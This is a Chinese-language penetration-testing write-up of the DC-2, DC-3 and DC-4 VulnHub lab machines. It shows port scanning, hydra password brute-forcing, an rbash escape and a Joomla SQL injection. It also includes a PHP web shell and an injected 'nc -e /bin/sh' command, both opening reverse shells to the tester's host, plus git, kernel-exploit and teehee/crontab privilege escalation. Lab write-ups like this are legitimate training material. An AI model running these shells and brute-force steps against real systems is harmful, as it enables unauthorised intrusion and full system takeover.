# DC2-DC4：vulnhub靶机渗透测试

阅读量 **470223**

|评论 **7**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-05-21 14:30:26

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t016f73e4a4635ece03.jpg)

## 靶机环境及下载

dc1-dc6靶机下载地址:<http://www.five86.com/>

DC2靶机ip:192.168.56.160

DC3靶机ip:192.168.56.161

DC4靶机ip:192.168.56.162

说明:获取目标主机的flag

## 知识点

nmap扫描  
hydra爆破  
cewl密码生成  
git shell  
joomla SQL注入  
linux拒绝服务提权  
命令注入  
teehee root shell

## 渗透测试

###  DC2

第一步使用nmap扫描目标网络端口服务

`namp -A 192.168.56.160`

![](https://p2.ssl.qhimg.com/t01c02589ed235372c3.png)

经扫描目标只开放80端口，从扫描结果看出还需要设置hosts文件才能访问，添加好hosts

![](https://p5.ssl.qhimg.com/t016bbcedebfa062d53.png)

访问<http://dc-2> 页面是一个wordpress，看见了flag1，flag1给出提示密码在这页面上

使用cewl生成密码

`cewl -w dc2_passwords.txt http://dc-2`

有密码了但没有用户名呀,wpscan扫描

![](https://p2.ssl.qhimg.com/t01343a314df68f529c.png)

扫描结果得到了三个用户名admin,tom,jerry得到用户名和密码之后就开始爆破

`hydra -L dc-2_user.txt -P dc-2_password.txt dc-2 http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`

![](https://p4.ssl.qhimg.com/t012cc5f272da525424.png)

使用jerry账户登录才能得到flag2

![](https://p0.ssl.qhimg.com/t016cb5883d86ebf0c2.png)

由于权限的限定不能给他反弹个shell,我再次对目标网络端口进行扫描结果发现了ssh端口7744

使用tom成功登录

`ssh [tom@192.168.56](mailto:tom@192.168.56).160 -p 7744`

出现-rbash: id: command not found 参考<https://www.anquanke.com/post/id/173159>
里面的绕过

导入$PATH

`export PATH=/usr/sbin:/usr/bin:/sbin:/bin`

![](https://p5.ssl.qhimg.com/t013ce4db4969aed07f.png)

![](https://p2.ssl.qhimg.com/t0137483c04d14c1c56.png)

切换jerry用户找到了flag4.txt,提示可以git提权参考<https://gtfobins.github.io/gtfobins/git/>

![](https://p2.ssl.qhimg.com/t0142b92506c7bf5c6e.png)

![](https://p3.ssl.qhimg.com/t01ed791586a9a0f675.png)

###  DC3

访问<http://192.168.56.161>

![](https://p3.ssl.qhimg.com/t01f7ae67e47611ee20.png)

此框架为joomla,使用joomscan工具扫描检测到版本为3.7.0
此版本有个SQL注入直接使用[工具](https://github.com/XiphosResearch/exploits/tree/master/Joomblah)
或者手工注入

![](https://p1.ssl.qhimg.com/t0115b80f10a2092b95.png)

得到了admin的hash密码，爆破一下得到密码snoopy，登录,接下来反弹shell

写入代码

<?php

system(‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.1
1337 >/tmp/f’);

?>

![](https://p5.ssl.qhimg.com/t01864af810939dbdd0.png)

访问<http://192.168.56.161/templates/protostar/shell.php> 即可反弹shell

查看linux版本lsb_relase -a

![](https://p0.ssl.qhimg.com/t018dca25f9ee3c3e0a.png)

接下来使用[linux拒绝服务漏洞进行提权](https://www.exploit-db.com/exploits/39772)

![](https://p5.ssl.qhimg.com/t01eb9bdad05820f2bc.png)

###  DC4

使用namp扫描

![](https://p5.ssl.qhimg.com/t01a6da411efc02ee36.png)

目标开放了22,80两个端口

访问80端口 <http://192.168.56.162>

![](https://p0.ssl.qhimg.com/t0105011af390783c04.png)

说用admin登录，而且看出没有什么限制爆破一下

`hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.162 http-post-form "/login.php:username=^USER^&password=^PASS^:S=logout" -F`

![](https://p0.ssl.qhimg.com/t01e62936d95b529ae5.png)

得到了密码happy,登录之后可以看到能够执行ls -l, du -h,df -h这三个命令，可以看出可能存在命令注入漏洞。

![](https://p2.ssl.qhimg.com/t0197ce3ef771936ec8.png)

使用burp抓包,修改radio参数里面的内容，反弹shell

`nc -e /bin/sh 192.168.56.1 1234`

![](https://p1.ssl.qhimg.com/t019d269357a70d2d7e.png)

在home目录找到三个用户charles, jim,sam,结果在jim用户下找到一个password文件

![](https://p0.ssl.qhimg.com/t019a79f46edc1f7676.png)

复制下来进行爆破

`hydra -L dc4-user.txt -P dc4-password.txt -t 6 ssh://192.168.56.162`

![](https://p4.ssl.qhimg.com/t0188248b95c3e42216.png)

切换为jim用户,读取用户下的mbox，为一个邮件

![](https://p0.ssl.qhimg.com/t010402c6f8d49d0017.png)

去/var/mail/下得到charles的密码

![](https://p1.ssl.qhimg.com/t01869de587b0359dbf.png)

再次切换用户

![](https://p0.ssl.qhimg.com/t01b0a8eb019f4731f3.png)

sudo -l 却提示可以看到可以使用teehee进行root shell，将他写入crontab计划任务中

![](https://p1.ssl.qhimg.com/t0174fb53bad8334b66.png)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Mr.Lee** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/178658](/post/id/178658)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [渗透测试](/tag/渗透测试)
  * [靶机](/tag/靶机)

 **+1** __15赞

 __收藏

![](https://p4.ssl.qhimg.com/t01acc4d4e37ad357f0.png) Mr.Lee

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

